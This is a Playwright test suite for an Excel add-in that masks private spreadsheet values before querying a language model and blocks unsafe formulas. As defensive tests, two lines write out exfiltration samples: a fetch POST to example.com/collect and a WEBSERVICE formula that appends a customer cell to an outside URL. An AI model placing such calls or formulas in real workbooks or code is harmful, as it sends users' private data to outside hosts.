// End-to-end tests of the built task pane against a fake Excel host and a scripted model.
// Build first: `npm run build`. The page runs under its real Content Security Policy.
import { expect, test } from "@playwright/test";
import {
  CHAT_URL,
  ORDERS,
  cellText,

  enterKey,
  leakedValues,
  openPane,
  preview,
  reply,
  userTurn,
} from "./harness";

const TOKEN = /\b(?:NYMFORM_)?(?:PERSON|EMAIL|ID|TEXT)_\d{3,}\b/;

function column(page: import("@playwright/test").Page, letter: string) {
  return page.getByRole("listitem", { name: `Column ${letter}` });
}

test("the pane loads under its CSP with the defaults a tester needs", async ({ page }) => {
  const pane = await openPane(page);
  await expect(page.getByRole("heading", { name: "Setup" })).toBeVisible();
  await expect(page.getByText("Your key is sent only to openrouter.ai and is forgotten when you close this pane.")).toBeVisible();
  await expect(page.getByLabel("Endpoint")).toHaveValue("https://openrouter.ai/api/v1");
  await expect(page.getByLabel("Endpoint")).not.toBeEditable();
  await expect(page.getByLabel("Model")).toHaveValue("openai/gpt-6-luna");
  await expect(page.getByText(/^Nymform for Excel 0\.1\.0-alpha · (build \w+|local build) · SkySpan$/)).toBeVisible();
  await enterKey(page);
  await expect(page.getByText("Using Orders, A1:F501 · 500 rows")).toBeVisible();
  // Customer and Email are suggested private; Region, Order date, Product and Amount are not.
  for (const [letter, isPrivate] of [["A", true], ["B", true], ["C", false], ["D", false], ["E", false], ["F", false]] as const) {
    const box = column(page, letter).getByRole("checkbox", { name: "Keep private" });
    if (isPrivate) await expect(box).toBeChecked();
    else await expect(box).not.toBeChecked();
  }
  expect(pane.cspViolations).toEqual([]);
  expect(pane.consoleErrors).toEqual([]);
});

test("the CSP only lets the pane connect to the endpoint (invariant 10)", async ({ page }) => {
  const pane = await openPane(page);
  await expect(page.getByRole("heading", { name: "Setup" })).toBeVisible();
  const outcome = await page.evaluate(async () => {
    try {
      await window["fetch"]("https://example.com/collect", { method: "POST", body: "x" });
      return "sent";
    } catch {
      return "refused";
    }
  });
  expect(outcome).toBe("refused");
  expect(pane.cspViolations.join("\n")).toMatch(/example\.com/);
});

test("structure only: a private name goes out as a stand-in, comes back restored, and is inserted", async ({ page }) => {
  const name = cellText(ORDERS, "Orders", "A2");
  const pane = await openPane(page, {
    model: (sent) => {
      const token = TOKEN.exec(String(userTurn(sent.body).task))?.[0] ?? "MISSING";
      return reply({
        kind: "formula",
        formula: `=SUMIFS(F2:F501,A2:A501,"${token}")`,
        placement: { cell: "H2", fill_down: false },
        explanation: `Adds Amount for rows where Customer is ${token}.`,
        assumptions: ["Amount is in column F."],
      });
    },
  });
  await enterKey(page);
  await preview(page, `Total Amount for ${name}`);

  // What gets sent: checked, the name replaced, the exact request shown on demand.
  await expect(page.getByText("Checked: no private values found")).toBeVisible();
  await expect(page.getByText(/bytes to openrouter\.ai · Structure only/)).toBeVisible();
  await expect(page.getByText("Formatted for reading. The check runs on the exact request sent to openrouter.ai.")).toBeVisible();
  const previewText = await page.locator("main, body").first().innerText();
  expect(previewText).not.toContain(name);
  await page.getByText("Show exact request").click();
  const exact = await page.getByLabel("Exact request", { exact: true }).innerText();
  expect(exact).toContain('"provider":{"zdr":true}');
  expect(exact).not.toContain(name);

  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByRole("heading", { name: "Formula" })).toBeVisible();

  // The request that left: exactly what was shown, no private value, ZDR routing, the right headers.
  expect(pane.sent).toHaveLength(1);
  const sent = pane.sent[0]!;
  expect(sent.body).toBe(exact);
  expect(leakedValues(sent.body)).toEqual([]);
  const body = JSON.parse(sent.body);
  expect(body.provider).toEqual({ zdr: true });
  expect(body.model).toBe("openai/gpt-6-luna");
  expect(body.temperature).toBeUndefined();
  expect(sent.headers["x-title"]).toBe("Nymform for Excel");
  expect(sent.headers["authorization"]).toBe("Bearer fake-key-for-tests");
  const turn = userTurn(sent.body);
  expect(turn.mode).toBe("structure_only");
  expect(turn.rows).toBeUndefined();
  expect(String(turn.task)).toMatch(/^Total Amount for (NYMFORM_)?PERSON_\d{3,}$/);

  // Result: restored inside the string literal, gate passed twice, explanation restored for display.
  await expect(page.locator('pre[aria-label="Formula"]')).toHaveText(`=SUMIFS(F2:F501,A2:A501,"${name}")`);
  await expect(page.getByText("Formula check passed: allowed functions and your ranges only.")).toBeVisible();
  await expect(page.getByText(`Adds Amount for rows where Customer is ${name}.`)).toBeVisible();

  // Nothing is written before Insert.
  expect(await page.evaluate(() => (window as unknown as { __NYMFORM_FAKE__: { writes: unknown[] } }).__NYMFORM_FAKE__.writes)).toEqual([]);
  await page.getByRole("button", { name: "Insert formula" }).click();
  await expect(page.getByText("Inserted in H2.")).toBeVisible();
  const cell = await page.evaluate(() =>
    (window as unknown as { __NYMFORM_FAKE__: { getCell(s: string, a: string): { formula?: string } | null } }).__NYMFORM_FAKE__.getCell("Orders", "H2"),
  );
  expect(cell?.formula).toBe(`=SUMIFS(F2:F501,A2:A501,"${name}")`);

  // The log keeps what was sent; the export never holds the key or the real name.
  await page.getByRole("tab", { name: "Log" }).click();
  await expect(page.getByText(/Check: passed · Formula check: passed · Provider: Azure · Inserted/)).toBeVisible();
  expect(pane.cspViolations).toEqual([]);
  expect(pane.consoleErrors).toEqual([]);
});

test("sample rows: private columns go out as stand-ins and nothing from them leaks", async ({ page }) => {
  const pane = await openPane(page, {
    model: () => reply({ kind: "formula", formula: "=SUMIFS(F2:F501,C2:C501,\"West\")", explanation: "Adds Amount for West." }),
  });
  await enterKey(page);
  await preview(page, "Total Amount for the West region", "rows");
  await expect(page.getByText("Checked: no private values found")).toBeVisible();
  await expect(page.getByText(/bytes to openrouter\.ai · Sample rows/)).toBeVisible();
  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByRole("heading", { name: "Formula" })).toBeVisible();

  const turn = userTurn(pane.sent[0]!.body);
  expect(turn.mode).toBe("substituted");
  const rows = turn.rows as unknown[][];
  expect(rows).toHaveLength(50);
  expect(turn.rows_total).toBe(500);
  for (const row of rows) {
    expect(String(row[0])).toMatch(TOKEN); // Customer
    expect(String(row[1])).toMatch(TOKEN); // Email
  }
  expect(rows[0]![2]).toBe(cellText(ORDERS, "Orders", "C2")); // Region is sent as is
  expect(leakedValues(pane.sent[0]!.body)).toEqual([]);
});

test("Insert asks before replacing cells that already have values", async ({ page }) => {
  await openPane(page, {
    model: () => reply({ kind: "formula", formula: "=GROUPBY(C2:C501,F2:F501,SUM)", placement: { cell: "H2", fill_down: false }, explanation: "Totals." }),
  });
  await page.evaluate(() =>
    (window as unknown as { __NYMFORM_FAKE__: { setCell(s: string, a: string, c: unknown): void } }).__NYMFORM_FAKE__.setCell("Orders", "H2", {
      value: "keep me",
      text: "keep me",
      type: "String",
    }),
  );
  await enterKey(page);
  await preview(page, "Total Amount per Region");
  await page.getByRole("button", { name: "Send" }).click();
  await page.getByRole("button", { name: "Insert formula" }).click();
  await expect(page.getByText("H2 already has values. Insert anyway to replace them; Excel can't undo this.")).toBeVisible();
  const before = await page.evaluate(() =>
    (window as unknown as { __NYMFORM_FAKE__: { getCell(s: string, a: string): { value?: unknown } | null } }).__NYMFORM_FAKE__.getCell("Orders", "H2"),
  );
  expect(before?.value).toBe("keep me");
  await page.getByRole("button", { name: "Replace and insert" }).click();
  await expect(page.getByText("Inserted in H2.")).toBeVisible();
});

test("a WEBSERVICE reply is rejected by the formula gate and can't be inserted", async ({ page }) => {
  await openPane(page, {
    model: () => reply({ kind: "formula", formula: '=WEBSERVICE("https://x.test/?d="&A2)', explanation: "Looks it up." }),
  });
  await enterKey(page);
  await preview(page, "Look up each customer");
  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByText("Blocked: this formula can't be inserted.")).toBeVisible();
  await expect(page.getByText(/WEBSERVICE/).first()).toBeVisible();
  await expect(page.getByRole("button", { name: "Insert formula" })).toBeDisabled();
  expect(await page.evaluate(() => (window as unknown as { __NYMFORM_FAKE__: { writes: unknown[] } }).__NYMFORM_FAKE__.writes)).toEqual([]);
});

test("a part of a private value with one candidate goes out as its stand-in; kept as typed, the check blocks it", async ({ page }) => {
  const name = cellText(ORDERS, "Orders", "A2");
  const first = name.split(" ")[0]!;
  const pane = await openPane(page);
  await enterKey(page);
  await preview(page, `Orders where the customer is called ${first}`);
  // Only one private value holds the first name, so it is read as that value's stand-in.
  await expect(page.getByText(`Read “${first}” as ${name}.`)).toBeVisible();
  await expect(page.getByText("Checked: no private values found")).toBeVisible();
  await page.getByText("Show exact request").click();
  const exact = await page.getByLabel("Exact request", { exact: true }).innerText();
  expect(exact).not.toContain(first);
  expect(String(userTurn(exact).task)).toMatch(/^Orders where the customer is called (NYMFORM_)?PERSON_\d{3,}$/);

  // Keep as typed: the part stays in the question, so the auditor blocks it and nothing is sent.
  await page.getByRole("button", { name: "Keep as typed" }).click();
  await expect(page.getByText("Blocked: a value from column A is in the request.")).toBeVisible();
  await expect(page.getByText(`“${first}” is kept as typed, so the check blocks it.`)).toBeVisible();
  await expect(page.getByRole("button", { name: "Send" })).toBeDisabled();
  expect(pane.sent).toEqual([]);
  await page.getByRole("tab", { name: "Log" }).click();
  await expect(page.getByText(/Check: blocked/)).toBeVisible();
});

test("a blocked request shows on the Log what the check found and where; Export log leaves it out", async ({ page }) => {
  const name = cellText(ORDERS, "Orders", "A2");
  const first = name.split(" ")[0]!;
  const pane = await openPane(page);
  await enterKey(page);
  await preview(page, `Orders where the customer is called ${first}`);
  await page.getByRole("button", { name: "Keep as typed" }).click();
  await expect(page.getByText("Blocked: a value from column A is in the request.")).toBeVisible();
  // The preview says where, never what.
  await expect(page.getByText("Found in your question.")).toBeVisible();
  expect(pane.sent).toEqual([]);

  // The Log shows the matched text, the text around it, and why it counts.
  await page.getByRole("tab", { name: "Log" }).click();
  const found = page.getByRole("list", { name: "What the check found" });
  await expect(found.getByText(`Found “${first}” in your question`)).toBeVisible();
  await expect(found.getByLabel("Text around it")).toContainText(`the customer is called ${first}`);
  await expect(found.getByText("It matches a value (a word of a value) from private column A.")).toBeVisible();
  await expect(page.getByText("Shown only here. Not in Export log or the evaluation report.")).toBeVisible();

  // Neither export holds it.
  const exported = async (button: string, label: string) => {
    await page.getByRole("button", { name: button }).click();
    const asText = page.getByRole("button", { name: "No file? Show it as text" });
    if (await asText.isVisible()) await asText.click();
    return page.getByLabel(label).inputValue();
  };
  const log = await exported("Export log", "Log as text");
  expect(JSON.parse(log)).toHaveLength(1);
  expect(log).toContain(`"variant": "word"`);
  expect(log.toLowerCase()).not.toContain(first.toLowerCase());
  expect(log).not.toContain("your question");
  const report = await exported("Export evaluation report", "Evaluation report as text");
  expect(report.toLowerCase()).not.toContain(first.toLowerCase());
});

test("a part with several candidates: the pane lists them, shows each in the sheet, and sends only the chosen stand-in", async ({ page }) => {
  // A name part shared by several different customers in the synthetic orders (a family name).
  const names = new Set<string>();
  for (let r = 2; r <= 501; r++) names.add(cellText(ORDERS, "Orders", `A${r}`));
  const byPart = new Map<string, string[]>();
  for (const n of names) for (const w of n.split(" ")) byPart.set(w, [...(byPart.get(w) ?? []), n]);
  const [first, owners] = [...byPart.entries()].find(([w, list]) => list.length >= 2 && w.length >= 4)!;
  const pane = await openPane(page, {
    model: (sent) => {
      const token = TOKEN.exec(String(userTurn(sent.body).task))?.[0] ?? "MISSING";
      return reply({ kind: "formula", formula: `=SUMIFS(F2:F501,A2:A501,"${token}")`, placement: { cell: "H2", fill_down: false }, explanation: "Adds Amount.", assumptions: [] });
    },
  });
  await enterKey(page);
  await preview(page, `Total Amount for ${first}`);

  const picker = page.getByRole("region", { name: `Which value is ${first}?` });
  await expect(picker.getByText(`is part of ${owners.length} private values. Which did you mean?`)).toBeVisible();
  await expect(page.getByText("Blocked: a value from column A is in the request.")).toBeVisible();
  await expect(page.getByRole("button", { name: "Send" })).toBeDisabled();
  for (const owner of owners) await expect(picker.getByRole("checkbox", { name: owner })).toBeVisible();

  // Show in sheet selects that value's cells in Excel and writes nothing.
  const chosen = owners[0]!;
  await picker.getByRole("button", { name: `Show ${chosen} in the sheet` }).click();
  const fakeState = () =>
    page.evaluate(() => {
      const f = (window as unknown as { __NYMFORM_FAKE__: { selections: { sheet: string; address: string }[]; writes: unknown[] } }).__NYMFORM_FAKE__;
      return { selections: f.selections.slice(), writes: f.writes.slice() };
    });
  await expect.poll(async () => (await fakeState()).selections.length).toBe(1);
  const rows = [];
  for (let r = 2; r <= 501; r++) if (cellText(ORDERS, "Orders", `A${r}`) === chosen) rows.push(`A${r}`);
  expect((await fakeState()).selections[0]).toEqual({ sheet: "Orders", address: rows.join(", ") });

  // Choose it: the question goes out with its stand-in, and the selection is put back.
  await picker.getByRole("checkbox", { name: chosen }).check();
  await picker.getByRole("button", { name: "Use this value" }).click();
  await expect(page.getByText(`“${first}” is ${chosen}.`)).toBeVisible();
  await expect(page.getByText("Checked: no private values found")).toBeVisible();
  await expect.poll(async () => (await fakeState()).selections.at(-1)).toEqual({ sheet: "Orders", address: "A1:F501" });
  expect((await fakeState()).writes).toEqual([]);

  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByRole("heading", { name: "Formula" })).toBeVisible();
  expect(pane.sent).toHaveLength(1);
  const body = pane.sent[0]!.body;
  expect(body).not.toContain(first);
  expect(leakedValues(body)).toEqual([]);
  expect(String(userTurn(body).task)).toMatch(/^Total Amount for (NYMFORM_)?PERSON_\d{3,}$/);
  await expect(page.locator('pre[aria-label="Formula"]')).toHaveText(`=SUMIFS(F2:F501,A2:A501,"${chosen}")`);
});

test("a rejected key shows a plain message and no stack trace", async ({ page }) => {
  await openPane(page, { model: () => ({ status: 401, json: { error: { message: "No auth credentials found", code: 401 } } }) });
  await enterKey(page, "wrong-key");
  await preview(page, "Total Amount per Region");
  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByText("Your API key was rejected. Check it in Setup.")).toBeVisible();
  await expect(page.getByText(/at \w+ \(|TypeError|Error:/)).toHaveCount(0);
});

test("no zero-data-retention route shows the plain message", async ({ page }) => {
  await openPane(page, {
    model: () => ({ status: 404, json: { error: { message: "No endpoints found matching your data policy (Zero data retention).", code: 404 } } }),
  });
  await enterKey(page);
  await preview(page, "Total Amount per Region");
  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByText(/No zero-data-retention route can serve openai\/gpt-6-luna right now/)).toBeVisible();
});

test("an unreadable reply gets exactly one audited correction, previewed before it is sent, then a plain message", async ({ page }) => {
  const pane = await openPane(page, { model: () => "Sure! Here is your formula: SUM(F2:F501)" });
  await enterKey(page);
  await preview(page, "Total Amount");
  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByText("Asking once more")).toBeVisible();
  expect(pane.sent).toHaveLength(1);
  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByText("The model's reply couldn't be read. Try rephrasing.")).toBeVisible();
  expect(pane.sent).toHaveLength(2);
  const retry = JSON.parse(pane.sent[1]!.body) as { messages: { role: string; content: string }[] };
  expect(retry.messages.at(-2)?.role).toBe("assistant");
  expect(retry.messages.at(-1)?.content).toMatch(/^Your previous reply could not be read/);
});

test("a clarify reply shows the model's question and the answer goes out with it", async ({ page }) => {
  const pane = await openPane(page, {
    model: (_sent, i) =>
      i === 0
        ? reply({ kind: "clarify", formula: null, explanation: "Do you want totals per region or one grand total?" })
        : reply({ kind: "formula", formula: "=GROUPBY(C2:C501,F2:F501,SUM)", explanation: "Totals per region." }),
  });
  await enterKey(page);
  await preview(page, "Total Amount");
  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.getByText("Do you want totals per region or one grand total?")).toBeVisible();
  await page.getByLabel("Your answer").fill("Per region");
  await page.getByRole("button", { name: /Preview/ }).click();
  await page.getByRole("button", { name: "Send" }).click();
  await expect(page.locator('pre[aria-label="Formula"]')).toHaveText("=GROUPBY(C2:C501,F2:F501,SUM)");
  const second = JSON.parse(pane.sent[1]!.body) as { messages: { role: string }[] };
  expect(second.messages.map((m) => m.role)).toEqual(["system", "user", "assistant", "user"]);
});

test("outside Excel the pane says where to open it", async ({ page }) => {
  await openPane(page, { noOffice: true });
  await expect(page.getByText("Open Nymform from the Home tab in Excel.")).toBeVisible({ timeout: 30_000 });
});

test("the endpoint is only called after Send", async ({ page }) => {
  const pane = await openPane(page);
  await enterKey(page);
  await preview(page, "Total Amount per Region");
  await page.getByRole("tab", { name: "Log" }).click();
  expect(pane.sent).toEqual([]);
  expect(await page.evaluate((url) => performance.getEntriesByType("resource").some((e) => e.name.startsWith(url)), CHAT_URL)).toBe(false);
});

// Real network. Opt in with NYMFORM_E2E_LIVE=1. Without OPENROUTER_API_KEY it checks the real
// 401 path through CORS; with a key it runs the primary flow (CP2: a structure-only question comes
// back as a formula that passes the gate) against the default model, or NYMFORM_E2E_MODEL.
test.describe("live OpenRouter", () => {
  test.skip(!process.env.NYMFORM_E2E_LIVE, "set NYMFORM_E2E_LIVE=1 to call the real endpoint");

  test("a real request with a bad key comes back as the plain 401 message", async ({ page }) => {
    test.skip(Boolean(process.env.OPENROUTER_API_KEY), "a key is set; the full live flow runs instead");
    const pane = await openPane(page, { live: true });
    await enterKey(page, "not-a-real-key");
    await preview(page, "Total Amount per Region");
    await page.getByRole("button", { name: "Send" }).click();
    await expect(page.getByText("Your API key was rejected. Check it in Setup.")).toBeVisible({ timeout: 30_000 });
    expect(pane.cspViolations).toEqual([]);
    expect(leakedValues(pane.sent[0]!.body)).toEqual([]);
  });

  test("the primary flow against the default model", async ({ page }, info) => {
    const key = process.env.OPENROUTER_API_KEY;
    test.skip(!key, "set OPENROUTER_API_KEY (a capped key) to run against the real model");
    test.setTimeout(120_000);
    const model = process.env.NYMFORM_E2E_MODEL || undefined;
    info.annotations.push({ type: "model", description: model ?? "default" });
    const pane = await openPane(page, { live: true });
    await enterKey(page, key, model);
    await preview(page, "Total Amount per Region, one row per region");
    await page.getByRole("button", { name: "Send" }).click();
    // CP2 needs a formula. Any other outcome (a question back, an answer, a block or an error) fails
    // at once with what the pane shows, instead of timing out.
    const formula = page.getByRole("heading", { name: "Formula" });
    const other = page
      .getByRole("heading", { name: "The model asks" })
      .or(page.getByRole("heading", { name: "Answer" }))
      .or(
        page.getByText(
          /^Blocked:|was rejected|out of credits|^Rate limited|isn't responding|took too long|^Couldn't reach|No zero-data-retention route|refused the request|returned an error|unexpected response|reply couldn't be read|^Something went wrong/u,
        ),
      );
    await expect(formula.or(other).first()).toBeVisible({ timeout: 90_000 });
    if (!(await formula.isVisible())) throw new Error(`no formula came back: ${await page.locator("main").innerText()}`);
    await expect(page.getByText("Formula check passed: allowed functions and your ranges only.")).toBeVisible();
    await page.getByRole("button", { name: "Insert formula" }).click();
    await expect(page.getByText(/^Inserted in [A-Z]+\d+\.$/)).toBeVisible();
    expect(leakedValues(pane.sent[0]!.body)).toEqual([]);
  });
});


